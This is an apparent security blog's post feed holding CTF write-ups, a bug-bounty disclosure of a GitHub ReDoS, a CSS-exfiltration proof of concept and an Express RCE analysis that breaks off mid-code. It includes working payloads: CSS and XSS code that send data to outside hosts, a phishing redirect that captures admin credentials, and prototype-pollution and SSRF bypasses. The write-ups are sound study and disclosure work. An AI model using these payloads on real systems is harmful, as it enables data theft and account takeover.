[
  
  {
    "title": "JustCTF 2025 Positive Players Write Up",
    "url": "/posts/Just-CTF-2025/",
    "categories": "",
    "tags": "",
    "date": "2025-08-03 09:00:00 +0900",
    





    
    "snippet": "i joined in justctf 2025 to solve web challs, there were 7 web challs and i aimed to solve Simple Tasks and Positive Players. However Simple Tasks was really difficult that i couldn’t even approach...",
    "content": "i joined in justctf 2025 to solve web challs, there were 7 web challs and i aimed to solve Simple Tasks and Positive Players. However Simple Tasks was really difficult that i couldn’t even approach to solve the chall but Positive Players was easy challs like we breath cuz i have solved a lot of challs ab Prototype Pollutionapp.get('/flag', isAuthenticated, (req, res, next)=&gt;{  if(users[req.session.userId].isAdmin == true){    return res.end(FLAG);  }  return res.end(\"Not admin :(\");});To get a flag, as we can look in the code, we should log in as account which has the admin roleapp.post('/register', (req, res) =&gt; {  const { username, password } = req.body;  if (users[username]) {    req.session.errorMessage = 'User already exists!';    return res.redirect('/register');  }    // Storing the password in plaintext for the CTF scenario.  // DO NOT do this in a real application!  users[username] = {    password: password,    isAdmin: false,    themeConfig: {      theme: {        primaryColor: '#6200EE',        secondaryColor: '#03DAC6',        fontSize: '16px',        fontFamily: 'Roboto, sans-serif'      }    }  };    req.session.userId = username;  res.redirect('/');});When we register an account, the account is always set to  isAdmin: false so we should find a way to pollute the isAdmin property// 6. A function to recursively merge objectsconst deepMerge = (target, source) =&gt; {  for (const key in source) {    if (source[key] instanceof Object &amp;&amp; key in target) {      Object.assign(source[key], deepMerge(target[key], source[key]));    }  }  Object.assign(target || {}, source);  return target;};// 7. A function to parse a query string with dot-notation keys.const parseQueryParams = (queryString) =&gt; {  if (typeof queryString !== 'string') {    return {};  }  const cleanString = queryString.startsWith('?') ? queryString.substring(1) : queryString;  const params = new URLSearchParams(cleanString);  const result = {};  for (const [key, value] of params.entries()) {    const path = key.split('.');    let current = result;    for (let i = 0; i &lt; path.length; i++) {      let part = path[i];      // Protect against Prototype Pollution vulnerability      if(['__proto__', 'prototype', 'constructor'].includes(part)){        part = '__unsafe$' + part;      }      if (i === path.length - 1) {        current[part] = value;      } else {        if (!current[part] || typeof current[part] !== 'object') {          current[part] = {};        }        current = current[part];      }    }  }  return result;};there are two functions called deepMerge(), parseQueryParams() and actually deepmerge() function looks clearly vulnerable to Prototype Pollution  // Parse the query string into a nested object  const queryString = req.url.split('?')[1] || '';  const parsedUpdates = parseQueryParams(queryString);  // If there are updates, merge them into the existing config.  if (Object.keys(parsedUpdates).length &gt; 0) {    // Merge the parsed updates into the user's theme config.    user.themeConfig = deepMerge(user.themeConfig, parsedUpdates);  }However, in /theme, parseQueryparams() function will be called before the objects are merged via deepmerge() function then used it in the second arg of deepMerge() but parseQueryparams() function sanitizes properties (__proto__, prototype, constructor) that can be exploited for Prototype Pollutionanyway, do you think we should only pollute like __proto__.isAdmin or constructor.prototype.isAdmin? actually not, as you can see, Object has a lot of properties. so back to the condition we need to the solve: users[req.session.userId].isAdmin == trueusers['valueOf'].isAdminusers['toString'].isAdmin(...)if we can use properties of object as username without registering, perhaps we can just solve it. it’s cuz that isAdmin doesn’t exist if the account is not registering  const user = users[username];  // Comparing the plaintext password for the CTF scenario.  // DO NOT do this in a real application!  if (user &amp;&amp; user.password === password) {    req.session.userId = username;    res.redirect('/');  }and why we can log in as properties of object without registering is cuz the properties used are contained in the user objectso just log in as random id then request to /theme?valueOf.isAdmin=1 (valueOf, tostring, toLocaleString, etc, everything is ok)then just log in as valueOf (password field should be deleted) and get a flag"
  },
  
  {
    "title": "CSS Exfiltration via attr() + image-set() from Chrome 133",
    "url": "/posts/css-exfiltration/",
    "categories": "",
    "tags": "",
    "date": "2025-04-15 09:00:00 +0900",
    





    
    "snippet": "Summaryinput[name=flag][value^=a]{    background: url('https://evm.pics/a');}input[name=flag][value^=b]{    background: url('https://evm.pics/b');}/* ... */In most cases, when exploiting CSS exfilt...",
    "content": "Summaryinput[name=flag][value^=a]{    background: url('https://evm.pics/a');}input[name=flag][value^=b]{    background: url('https://evm.pics/b');}/* ... */In most cases, when exploiting CSS exfiltration, they should have attempted to leak data using a payload like the one shown above. However, the process is often tedious, as each word must be leaked step by step but recently they can leak data at once not leaking as each words after Chrome 133 was releasedCSS attr() gets an upgrade from Chrome 133As you can check attr() function has been upgraded from Chrome 133, means it allows to get attrs data from tags so if attacker can use this function as well, the data will be leaked all data at once, i.e, words, they don’t need to leak each word step by step  &lt;input flag=\"flag{css-csscscscscscscs}\"&gt;let’s say there is an example like this. In the past, we would probably try to leak one word at a time but we don’t need to do that anymore we can just leak all data at once via attr()Payload to Leak data        --val: attr(flag);        background: url(var(--val)); // InvalidFirst of all, we can’t use url() since it was blocked for security so need to use image-set() function to leak data to external url    form {      --val: attr(flag);      background: image-set(var(--val));    }The payload can be written like this and image-set() function load resources based on the base URL so we should add the &lt;link&gt; tag to web page where the sensitive data is located&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;    &lt;head&gt;        &lt;meta charset=\"UTF-8\"&gt;        &lt;title&gt;CSS attr() PoC&lt;/title&gt;        &lt;link rel=\"stylesheet\" href=\"https://evm.pics/poc/exfiltration1.css\"&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;input flag=\"flag{css-csscscscscscscs}\"&gt;    &lt;/body&gt;&lt;/html&gt;Create the HTML file then open itWe can check that the flag was leaked to attacker’s serverHowever, this approach does not allow access to certain properties like the value of input elements, which imposes clear limitations on its use in practical attacks"
  },
  
  {
    "title": "($10,890) What is XSS in the ML/AI ecosystem, not only web3.0?",
    "url": "/posts/XSS-in-ML-Framework/",
    "categories": "",
    "tags": "",
    "date": "2023-09-14 11:00:53 +0900",
    





    
    "snippet": "Hi guys, i wanna introduce a way to earn $10k bounty on an open-source projects. a month ago, i reported a bug in the ML Framework. and the bug i found was not critical so i needed to find a way to...",
    "content": "Hi guys, i wanna introduce a way to earn $10k bounty on an open-source projects. a month ago, i reported a bug in the ML Framework. and the bug i found was not critical so i needed to find a way to escalate it low-severity to high-severity. first of all, the bug i found was xss. i know that most people think that is not the bug which has high severity but me and others know a way to exploit scenario via low-severity bug.  Account Takeover  CSRF  SSRFFirst of all, they can exploit to ato, csrf, ssrf, rce with xss when some researcher found an xss. However in real, if you succeeded in other than major companies like google, apple, facebook, shopify, you cannot earn substantial rewards from them with high percentage. In general, client-side bugs don’t yield high bounty but this changes significantly when the target is operates under the web3.0 or AI/MLIn the web ecosystem on the present era, web services are being developed under the influence of Web 3.0 and AI/ML technologies. web 3.0 services are primarily focused on areas like cryptocurrency and NFT exchanges and the AI/ML is typically conversational like ChatGPT, Bing AI Chatbot, etc. that means you can earn more bounty in web3.0 or AI/ML services than when you find a bug in modern web servicesAlso, many exchanges manage bug bounty programs and pay higher bounty compared to modern web services. that is why many researchers focus on bug bounty hunting in cryptocurrency exchanges. on the other hand, i have rarely seen people doing bug bounty work on AI/ML frameworks. Based on what i mentioned earlier, this means we can earn high bounty not only in Web 3.0 services but also in AI/ML services even if you found a bug like xss.Returning to my story, i actually found an XSS in an ML framework. however, i couldn’t earn a high bounty just by reporting the bug because it lacked impact. but the ML model’s data was saved in the web service, so  tried to find another bug to link it with the XSS. after diving back into it for three hours, i discovered an LFI bug and linked it with the XSS. then, i reported it again, and this time, they accepted the bug for a high bounty! i also recommend that you participate in bug bounty programs not only for general web services but also for these types of services. thx smdo you guys think there is a better bug than XSS for exploitation?"
  },
  
  {
    "title": "0-Day, Copy and Paste ReDoS in github.com",
    "url": "/posts/ReDos-in-Github/",
    "categories": "",
    "tags": "",
    "date": "2023-08-05 18:00:53 +0900",
    





    
    "snippet": "SummaryIn summary, I found a Self-ReDoS vulnerability in the issue feature of github.com and reported it to HackerOne.Analysisfunction onPaste$1(event) {    const { currentTarget: el } = event;    ...",
    "content": "SummaryIn summary, I found a Self-ReDoS vulnerability in the issue feature of github.com and reported it to HackerOne.Analysisfunction onPaste$1(event) {    const { currentTarget: el } = event;    if (shouldSkipFormatting(el))        return;    if (!event.clipboardData)        return;    const textToPaste = generateText(event.clipboardData);    if (!textToPaste)        return;    event.stopPropagation();    event.preventDefault();    const field = event.currentTarget;    if (field instanceof HTMLTextAreaElement) {        insertText(field, textToPaste);    }}Once the user performs a paste action, the onPaste$1() function is executed first. Upon examining the code of this function, you can observe that it calls the generateText() function, passing the ClipboardData as an argument.function generateText(transfer) {    if (Array.from(transfer.types).indexOf('text/html') === -1)        return;    const html = transfer.getData('text/html');    if (!/&lt;table/i.test(html))        return;    const parser = new DOMParser();    const parsedDocument = parser.parseFromString(html, 'text/html');    let table = parsedDocument.querySelector('table');    table = !table || table.closest('[data-paste-markdown-skip]') ? null : table;    if (!table)        return;    const formattedTable = tableMarkdown(table);    return html.replace(/&lt;meta.*?&gt;/, '').replace(/&lt;table[.\\S\\s]*&lt;\\/table&gt;/, `\\n${formattedTable}`);}In the generateText() function, the first logic checks the type of the received Clipboard data. If the type is ‘text/html’, the function immediately returns. However, since the type is divided using Array.from(), it bypasses the aforementioned filtering. Additionally, the Clipboard data must contain the value `&lt;table` to meet the condition. Once these conditions are met, the function uses DomParser to parse the Clipboard data and checks if there is a table tag within the parsed Element. Subsequently, the function employs replace() method to replace the meta tags in the html variable with an empty value.First Redos gadget/&lt;meta.*?&gt;/However, looking at the regular expression used here, it appears vulnerable to ReDos.Indeed, when I tried using ReDos Checker, I was able to confirm that it is vulnerable.According to the above, performing an infinite check on the value &lt;meta causes ReDoS (Regular Expression Denial of Service). However, when using .getData(‘text/html’) to retrieve values, it automatically adds the value &lt;meta charset='utf-8'&gt; to the beginning of the content, preventing ReDoS from occurring.Second Redos gadget/&lt;table[.\\S\\s]*&lt;\\/table&gt;/However, the second regular expression is also vulnerable to ReDoS, so I have decided to perform a ReDoS attack using it. According to the aforementioned report, the parsed data must contain the FORM tag element unconditionally.The ReDoS payload will be written as &lt;table&lt;table&lt;table&lt;table and similar patterns. However, since this is not a valid table tag, it cannot bypass the IF statement. But if we close it with &lt;/table&gt; and then use &lt;table&gt; to insert the table tag element, ReDoS will not occur. Therefore, to bypass this logic, I have inserted an arbitrary &lt;div&gt; tag to add the &lt;table&gt; tag.'&lt;table'.repeat(99999) + '&lt;div&gt;&lt;table&gt;&lt;/div&gt;'So, the payload has been created as described above0-day validation    Now, it is confirmed that ReDoS is functioning properly. By applying this payload in a GitHub issue, it should work as intended. The exploit is based on the table tag rather than the meta tag, enabling the execution of a 0-day ReDoS attack.Applying 0-Day to Github.comFor this test, I have set up the breakpoint as described above.If ReDoS does not occur within the generateText() function, the code execution will proceed directly without any delay from line 352. However, if ReDoS occurs within the generateText() function, due to the DoS effect, line 352 will not be executed immediately after line 351.    Let’s watch the video!In the first scenario, the result shows the insertion of a non-vulnerable payload, where ReDoS does not occur within the generateText() function. As a result, the code execution proceeds smoothly without any delays, starting from line 352.In the second scenario, the result displays the insertion of a ReDoS payload. ReDoS occurs within the generateText() function, causing a significant delay in that section of the code. As seen in the video, generateText() function stays for an extended period.Reference  Hackerone Report#2076605  Hackerone Add Report#2087681  Github Ticket#2270535  Pull Request"
  },
  
  {
    "title": "Line CTF 2023 Write Up",
    "url": "/posts/Line-CTF/",
    "categories": "",
    "tags": "",
    "date": "2023-03-26 18:00:53 +0900",
    





    
    "snippet": "  (Web) Baby Simple Gocurl   (Web) Adult Simple GocurlThese two challenges require reading flag in the /flag/ path via SSRF.(Web) Baby Simple Gocurln.startsWith(\"https://\") || n.startsWith(\"http://...",
    "content": "  (Web) Baby Simple Gocurl   (Web) Adult Simple GocurlThese two challenges require reading flag in the /flag/ path via SSRF.(Web) Baby Simple Gocurln.startsWith(\"https://\") || n.startsWith(\"http://\") ? window.open(n, \"_self\") : r.router.set(a.redirect_link ? n : \"/portal\")\tr.GET(\"/flag/\", func(c *gin.Context) {\t\treqIP := strings.Split(c.Request.RemoteAddr, \":\")[0]\t\tlog.Println(\"[+] IP : \" + reqIP)\t\tif reqIP == \"127.0.0.1\" {\t\t\tc.JSON(http.StatusOK, gin.H{\t\t\t\t\"message\": flag,\t\t\t})\t\t\treturn\t\t}\t\tc.JSON(http.StatusBadRequest, gin.H{\t\t\t\"message\": \"You are a Guest, This is only for Host\",\t\t})\t})first, to read the Flag, a request must be made using the 127.0.0.1 IP.\tr.GET(\"/curl/\", func(c *gin.Context) {\t\tclient := &amp;http.Client{\t\t\tCheckRedirect: func(req *http.Request, via []*http.Request) error {\t\t\t\treturn redirectChecker(req, via)\t\t\t},\t\t}\t\treqUrl := strings.ToLower(c.Query(\"url\"))\t\treqHeaderKey := c.Query(\"header_key\")\t\treqHeaderValue := c.Query(\"header_value\")\t\treqIP := strings.Split(c.Request.RemoteAddr, \":\")[0]\t\tfmt.Println(\"[+] \" + reqUrl + \", \" + reqIP + \", \" + reqHeaderKey + \", \" + reqHeaderValue)\t\tif c.ClientIP() != \"127.0.0.1\" &amp;&amp; (strings.Contains(reqUrl, \"flag\") || strings.Contains(reqUrl, \"curl\") || strings.Contains(reqUrl, \"%\")) {\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"message\": \"Something wrong\"})\t\t\treturn\t\t}\t\treq, err := http.NewRequest(\"GET\", reqUrl, nil)\t\tif err != nil {\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"message\": \"Something wrong\"})\t\t\treturn\t\t}\t\tif reqHeaderKey != \"\" || reqHeaderValue != \"\" {\t\t\treq.Header.Set(reqHeaderKey, reqHeaderValue)\t\t}\t\tresp, err := client.Do(req)\t\tif err != nil {\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"message\": \"Something wrong\"})\t\t\treturn\t\t}\t\tdefer resp.Body.Close()\t\tbodyText, err := ioutil.ReadAll(resp.Body)\t\tif err != nil {\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"message\": \"Something wrong\"})\t\t\treturn\t\t}\t\tstatusText := resp.Status\t\tc.JSON(http.StatusOK, gin.H{\t\t\t\"body\":   string(bodyText),\t\t\t\"status\": statusText,\t\t})\t})in this challenge, we can use the http module to send a request to the desired web service and get the response value.Get the parameter values of url, header_key, and header_value from the parameters received from the user.\t\tif c.ClientIP() != \"127.0.0.1\" &amp;&amp; (strings.Contains(reqUrl, \"flag\") || strings.Contains(reqUrl, \"curl\") || strings.Contains(reqUrl, \"%\")) {\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"message\": \"Something wrong\"})\t\t\treturn\t\t}but this challenge has a validation process as above. The IP of the user we currently delivered must be 127.0.0.1, and the characters flag, curl, % must not be included in the url value we sent.if c.ClientIP() != \"127.0.0.1\" &amp;&amp; (strings.Contains(reqUrl, \"flag\") || strings.Contains(reqUrl, \"curl\") || strings.Contains(reqUrl, \"%\"))oops but the conditional statement is a bit weird. we can bypass this by making it operate like false &amp;&amp; true.// https://github.com/gin-gonic/gin/blob/457fabd7e14f36ca1b5f302f7247efeb4690e49c/context.go#L768// ClientIP implements one best effort algorithm to return the real client IP.// It calls c.RemoteIP() under the hood, to check if the remote IP is a trusted proxy or not.// If it is it will then try to parse the headers defined in Engine.RemoteIPHeaders (defaulting to [X-Forwarded-For, X-Real-Ip]).// If the headers are not syntactically valid OR the remote IP does not correspond to a trusted proxy,// the remote IP (coming from Request.RemoteAddr) is returned.There is a comment as above in the part where the ClientIP() function is defined.(Web) Adult Simple Gocurl\t\tif strings.Contains(reqUrl, \"flag\") || strings.Contains(reqUrl, \"curl\") || strings.Contains(reqUrl, \"%\") {\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"message\": \"Something wrong\"})\t\t\treturn\t\t}all the code in this challenge is the same as baby. but the difference is the conditional statement above. we can’t bypass the conditional now\t\tif reqHeaderKey != \"\" || reqHeaderValue != \"\" {\t\t\treq.Header.Set(reqHeaderKey, reqHeaderValue)\t\t}But we can add any HTTP headers we want using header append logic=&gt; https://issues.redhat.com/browse/UNDERTOW-990?workflowName=GIT+Pull+Request+workflow+&amp;stepId=5For request which is redirected to index.html:$ curl -I -X GET  --header \"X-Forwarded-Prefix: /test-service\" \"http://localhost:8624/docs\"Current result is:HTTP/1.1 302 FoundLocation: http://localhost:8624/docs/index.htmlbut should be:HTTP/1.1 302 FoundLocation: http://localhost:8624/test-service/docs/index.htmlLet’s see the above before the exploit. we can see that it sets the X-Forwarded-Prefix: /test-service header when requesting /docs. as a result, the location to be redirected normally is /docs/index.html, but it is redirected to /test-service/docs/index.html.in other words, if we send a request to a place that returns a 302 response and send the X-Forwarded-Prefix header together, we can send the request to the desired path.[GIN-debug] redirecting request 301: / --&gt; /[GIN] 2023/03/26 - 13:27:32 | 200 |    1.877625ms |       127.0.0.1 | GET      \"/\"[GIN] 2023/03/26 - 13:27:32 | 200 |    3.854083ms |       127.0.0.1 | GET      \"/curl/?url=http://127.0.0.1:8080//\"if we send a request to http://127.0.0.1:8080//, we can see a 302 redirect back to the normalized path after normalizing the path. we figured out how to send a request to a place with a redirect response.[GIN-debug] redirecting request 301: /flag// --&gt; /flag//2023/03/26 13:29:25 [+] IP : 127.0.0.1[GIN] 2023/03/26 - 13:29:25 | 200 |      41.625µs |       127.0.0.1 | GET      \"/flag/\"[GIN] 2023/03/26 - 13:29:25 | 200 |     980.917µs |       127.0.0.1 | GET      \"/curl/?url=http://127.0.0.1:8080//&amp;header_key=X-Forwarded-Prefix&amp;header_value=/flag\"if we send a request like http://localhost:8080/curl/?url=http://127.0.0.1:8080//&amp;header_key=X-Forwarded-Prefix&amp;header_value=/flag, the redirect is executed. We can see that during this process we normalize the path using the X-Forwarded-Prefix header and send the request to /flag/."
  },
  
  {
    "title": "HTB apocalypse CTF 2023 spybug Write Up",
    "url": "/posts/HTBCTF2023/",
    "categories": "",
    "tags": "",
    "date": "2023-03-24 07:13:49 +0900",
    





    
    "snippet": "spybugrequire(\"dotenv\").config();const fs = require(\"fs\");const path = require(\"path\");const express = require(\"express\");const session = require(\"express-session\");const { createAdmin } = require(...",
    "content": "spybugrequire(\"dotenv\").config();const fs = require(\"fs\");const path = require(\"path\");const express = require(\"express\");const session = require(\"express-session\");const { createAdmin } = require(\"./utils/database\");const { visitPanel } = require(\"./utils/adminbot\");const genericRoutes = require(\"./routes/generic\");const panelRoutes = require(\"./routes/panel\");const agentRoutes = require(\"./routes/agents\");const application = express();const uploadsPath = path.join(__dirname, \"uploads\");if (!fs.existsSync(uploadsPath)) fs.mkdirSync(uploadsPath);application.use(\"/uploads\", express.static(uploadsPath));application.use(\"/static\", express.static(path.join(__dirname, \"static\")));application.use(express.urlencoded({ extended: true }));application.use(express.json());application.use(  session({    secret: 'asdf',    resave: true,    saveUninitialized: true,  }));application.use((req, res, next) =&gt; {  res.setHeader(\"Content-Security-Policy\", \"script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';\");  res.setHeader(\"Cache-Control\", \"no-cache, no-store, must-revalidate\");  res.setHeader(\"Pragma\", \"no-cache\");  res.setHeader(\"Expires\", \"0\");  next();});application.set(\"view engine\", \"pug\");application.use(genericRoutes);application.use(panelRoutes);application.use(agentRoutes);application.listen(process.env.API_PORT, \"0.0.0.0\", async () =&gt; {  console.log(`Listening on port ${process.env.API_PORT}`);});createAdmin();setInterval(visitPanel, 60000);In the main code, we can see that the admin bot connects every 60 seconds, and that CSP is applied to this service.exports.visitPanel = async () =&gt; {  try {    const browser = await puppeteer.launch(browserOptions);    let context = await browser.createIncognitoBrowserContext();    let page = await context.newPage();    await page.goto(\"http://0.0.0.0:\" + process.env.API_PORT, {      waitUntil: \"networkidle2\",      timeout: 5000,    });    await page.type(\"#username\", \"admin\");    await page.type(\"#password\", process.env.ADMIN_SECRET);    await page.click(\"#loginButton\");    await page.waitForTimeout(5000);    await browser.close();  } catch (e) {    console.log(e);  }};The admin bot logs in with the admin account every 60 seconds, stays in the service for 5 seconds, and then closes the browser.router.get(\"/panel\", authUser, async (req, res) =&gt; {  res.render(\"panel\", {    username:      req.session.username === \"admin\"        ? process.env.FLAG        : req.session.username,    agents: await getAgents(),    recordings: await getRecordings(),  });});the flag is set as an environment variable, and this flag is rendered in /panel if you have an administrator’s session.in the end, to get the flag, we have to log in with the admin account. But we can’t get admin’s account in this challenge.let’s think. The admin visits the challenge server every 60 seconds, logs in, connects to /panel, and stays there for 5 seconds. if XSS vulnerability occurs in /panel, we can hijack the flag when admin visits  res.render(\"panel\", {    username:      req.session.username === \"admin\"        ? process.env.FLAG        : req.session.username,    agents: await getAgents(),    recordings: await getRecordings(),  });let’s look at /panel router code. in addition to username, values such as agents and recordings are also rendered on the web page\t\t\t\t\t\t\ttd !{agent.hostname}\t\t\t\t\t\t\ttd !{agent.platform}\t\t\t\t\t\t\ttd !{agent.arch}the panel.pug file has the same snippet as above. Add the received agents to the td tag one by one. since there is no separate HTML Entity processing here, we will be able to insert the XSS payload into the value of hostname or platform or arch.script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';but we know that the CSP of this service is applied as above. since script-src is set to self, if the file upload of this challenge service is possible, we will be able to bypass CSP by uploading the poc file and using it.I tried uploading the poc.js file as above, but I could see that a strange 400 error occurred.const multerUpload = multer({  storage: storage,  fileFilter: (req, file, cb) =&gt; {    if (      file.mimetype === \"audio/wave\" &amp;&amp;      path.extname(file.originalname) === \".wav\"    ) {      cb(null, true);    } else {      return cb(null, false);    }  },});// (...)router.post(  \"/agents/upload/:identifier/:token\",  authAgent,  multerUpload.single(\"recording\"),  async (req, res) =&gt; {    if (!req.file) return res.sendStatus(400);    const filepath = path.join(\"./uploads/\", req.file.filename);    const buffer = fs.readFileSync(filepath).toString(\"hex\");    if (!buffer.match(/52494646[a-z0-9]{8}57415645/g)) {      fs.unlinkSync(filepath);      return res.sendStatus(400);    }    await createRecording(req.params.identifier, req.file.filename);    res.send(req.file.filename);  });so i decided to analyze the file upload logic. Uploading files was done using the multer module.    if (!buffer.match(/52494646[a-z0-9]{8}57415645/g)) {      fs.unlinkSync(filepath);      return res.sendStatus(400);    }i was able to confirm that the above regular expression exists in the file upload router /agents/upload/:identifier/:token.after reading the contents of the uploaded file and converting it to a hex value, it is checked whether there is a value matching the above regular expression in this value.this regular expression is the logic to check the signature code of the wav file. This is because the wav file has a signature code called RIFF/WAVE as shown above.as above, when I inserted the signature code of the wav file and uploaded the file, I could see that it worked normally.setTimeout(() =&gt; {    fetch(`https://591d128f7a785b47477306206135146f.m.pipedream.net/?flag=${document.getElementsByTagName('h2')[0].innerText}`)}, 1500);//RIFF1234WAVEthe final PoC is as abovei inserted the XSS payload into the hostname using the user information function, and i could see that it was normally inserted.if you do this process as it is on the problem server, you can obtain the flag as above."
  },
  
  {
    "title": "b01lers CTF 2023 Write Up",
    "url": "/posts/b01lers/",
    "categories": "",
    "tags": "",
    "date": "2023-03-20 07:13:49 +0900",
    





    
    "snippet": "SummaryCause I was lazy, I didn’t do ctf for a long time. If i say “cause I was busy”, it looks fucking stupid. When I’m solving, the time of ctf is only 5 hours, so i just decided to solve the web...",
    "content": "SummaryCause I was lazy, I didn’t do ctf for a long time. If i say “cause I was busy”, it looks fucking stupid. When I’m solving, the time of ctf is only 5 hours, so i just decided to solve the web challengefishy-motd 263 PointsI just created a tool to deploy messages to server admins in our company. They *love* clicking on them too!http://ctf.b01lers.com:5110Author: 0xMihirthe description is as aboveimport fastify from 'fastify';import fastifyFormbody from '@fastify/formbody';import fastifyStatic from '@fastify/static';import fs from 'fs';import path from 'path';import { fileURLToPath } from 'url';import puppeteer from 'puppeteer';import { nanoid } from 'nanoid';let messages = {}const server = fastify();server.register(fastifyFormbody);server.register(fastifyStatic, {    root: path.join(path.dirname(fileURLToPath(import.meta.url)), 'public'),    prefix: '/public/'});const flag = process.env.FLAG || 'flag{fake_flag}';const port = 5000;const user = process.env.ADMIN_USER || 'admin';const pass = process.env.ADMIN_PASS || 'pass';server.get('/', (req, res) =&gt; {    res.sendFile('index.html')});server.get('/style.css', (req, res) =&gt; {    res.sendFile('style.css')});server.get('/login', (req, res) =&gt; {    const id = req.query.motd;    if (!id) {        fs.readFile('./login.html', 'utf8', (err, data) =&gt; {            if (err) {                console.log(err);                res.status(500).send('Internal server error, please open a ticket');            }            else {                res.type('text/html').send(data.toString().replace('', 'Welcome to the server!'));            }        });    }    else {        if (id in messages) {            fs.readFile('./login.html', 'utf8', (err, data) =&gt; {                if (err) {                    console.log(err);                    res.status(500).send('Internal server error, please open a ticket');                }                else {                    res.type('text/html').send(data.toString().replace('', messages[id]));                }            });        } else {            res.send('MOTD not found');        }    }});server.post('/login', (req, res) =&gt; {    const username = req.body.username;    const password = req.body.password;    if (username === user &amp;&amp; password === pass) {        res.send(flag);    }    else {        res.send('Incorrect username or password');    }});server.get('/start', async (req, res) =&gt; {    const id = req.query.motd;    if (id &amp;&amp; id in messages) {        try {            const result = await adminBot(id);            if (result.error) {                res.send(result.error)            } else {                res.send('Hope everyone liked your message!')            }        } catch (err) {            console.log(err);            res.send('Something went wrong, please open a ticket');        }    } else {        res.send('MOTD not found');    }});server.post('/motd', (req, res) =&gt; {    const motd = req.body.motd;    const id = nanoid();    messages[id] = motd;    fs.readFile('./motd.html', 'utf8', (err, data) =&gt; {        if (err) {            console.log(err);            res.status(500).send('Internal server error, please open a ticket');        }        else {            res.type('text/html').send(data.toString().replaceAll('', id));        }    });})server.get('/motd', (req, res) =&gt; {    res.send('Please use the form to submit a message of the day.');});const adminBot = async (id) =&gt; {    const browser = await puppeteer.launch({        headless: true, // Uncomment below if the sandbox is causing issues        // args: ['--no-sandbox', '--disable-setuid-sandbox', '--single-process']    })    const page = await browser.newPage();    await page.setViewport({ width: 800, height: 600 });    const url = `http://localhost:${port}/login?motd=${id}`;    await page.goto(url);    await page.mouse.click(10, 10);    await new Promise(r =&gt; setTimeout(r, 1000));    try {        if (url !== await page.evaluate(() =&gt; window.location.href)) {            return { error: \"Hey! Something's fishy here!\" };        }    } catch (err) {        return { error: \"Hey! Something's fishy here!\" };    }    await new Promise(r =&gt; setTimeout(r, 5000));    await page.mouse.click(420, 280);    await page.keyboard.type(user);    await page.mouse.click(420, 320);    await page.keyboard.type(pass);    await page.mouse.click(420, 360);    await new Promise(r =&gt; setTimeout(r, 1000));    await browser.close();    messages[id] = undefined;    return { error: null };}server.listen({ port, host: '0.0.0.0' }, (err, address) =&gt; {    if (err) {        console.error(err);        process.exit(1);    }    console.log(`Server listening at ${address}`);});the condition of get a flag is log-in with an account of admin but we can’t log in normally because we can’t know an account of admin. but there is admin bot. the admin bot clicks specific coordinates, inputs the admin’s ID and password, and logs in.Also, in the login page, we can insert the motd value we created, and HTML code can be inserted via this logic.&lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; style-src 'self'; form-action 'self'\" /&gt;on the login page, CSP is set as above. the script can’t be executed because default-src is none. also, since form-src is self, even if an arbitrary form tag is added, data is not received by the personal server.    await page.mouse.click(10, 10);// (skip)    await new Promise(r =&gt; setTimeout(r, 5000));    await page.mouse.click(420, 280);    await page.keyboard.type(user);    await page.mouse.click(420, 320);    await page.keyboard.type(pass);    await page.mouse.click(420, 360);but here’s the strange part. The admin bot clicks once on coordinates (10,10). after that, click the coordinates (10, 10) above, and after 5 seconds, enter the account of admin in the login form and log in.If we insert a personal server link at coordinates (10, 10) using the a tag, the admin bot will click the link and move to the personal server. Since there is an interval of 5 seconds here, it is enough time for all pages to be rendered.Copy the login.html file, upload it to the personal server, and move the admin bot here to induce the admin account information to be transmitted to the personal server.I created login.html on my personal server as above.    try {        if (url !== await page.evaluate(() =&gt; window.location.href)) {            return { error: \"Hey! Something's fishy here!\" };        }    } catch (err) {        return { error: \"Hey! Something's fishy here!\" };    }but in the admim bot, the logic to check the current origin is added as above. So we shouldn’t go to the current page via the private server link. Open the private server in a new window using the blank option, and stay on the origin of the admin server for 1 second. but in this case, the personal server opens in a new window, so the log-in logic is just done on the problem server.but we can use the opener object to redirect an existing window to a desired location. Since the opener object points to the window at the existing window that opened itself, the existing window can also be redirected to the private server by using opener.location.href on the private server.&lt;!-- https://pocas.kr/re.html --&gt;&lt;script&gt;    setTimeout(() =&gt; {opener.location.href='/login.html'}, 2000)&lt;/script&gt;So I uploaded the redirect file as above&lt;a href=\"http://pocas.kr/re.html\" target=\"_blank\" rel=\"opener\"&gt;CSRF&lt;/a&gt;Now, create motd using the above payload and pass it to the admin bot.finally account is sent to my server❯ curl -X POST http://ctf.b01lers.com:5110/login -d \"username=n01_5y54dm1n&amp;password=7zzHuXRAp)uj@(qO@Zi0\"bctf{ph15h1ng_reel_w1th_0n3_e}~❯"
  },
  
  {
    "title": "Express, RCE via File Extension Confusing ≤ V4.18.2",
    "url": "/posts/RCE-Express-1/",
    "categories": "",
    "tags": "",
    "date": "2022-12-19 06:41:53 +0900",
    





    
    "snippet": "  Summary  Function call procedure  The analysis          /lib/application.js#L548L610      /lib/view.js#L52L95      /lib/application.js#L655L661      /lib/view.js#L133L136        How to trigger an...",
    "content": "  Summary  Function call procedure  The analysis          /lib/application.js#L548L610      /lib/view.js#L52L95      /lib/application.js#L655L661      /lib/view.js#L133L136        How to trigger an RCE          Code for Testing      Check ejs extension management logic      Exploit        MitigationSummaryExpress.js, or simply Express, is a web framework for Node.js, released as free and open source software licensed under the MIT license. It is being called the de facto standard server framework of Node.js.I started to analyze it. While analyzing several pieces of code, I found a way to trigger an RCE vulnerability via confusing file extenstion in the render() function.The express framework internally calls template libraries such as ejs, Handlebars, and dot using the require() function. Confusion arises in this process.Function call procedurerender() → View() → tryRender() → View.prototype.render → this.engine()The analysis/lib/application.js#L548L610app.render = function render(name, options, callback) {  var cache = this.cache;  var done = callback;  var engines = this.engines;  var opts = options;  var renderOptions = {};  var view;  // support callback function as second arg  if (typeof options === 'function') {    done = options;    opts = {};  }  // merge app.locals  merge(renderOptions, this.locals);  // merge options._locals  if (opts._locals) {    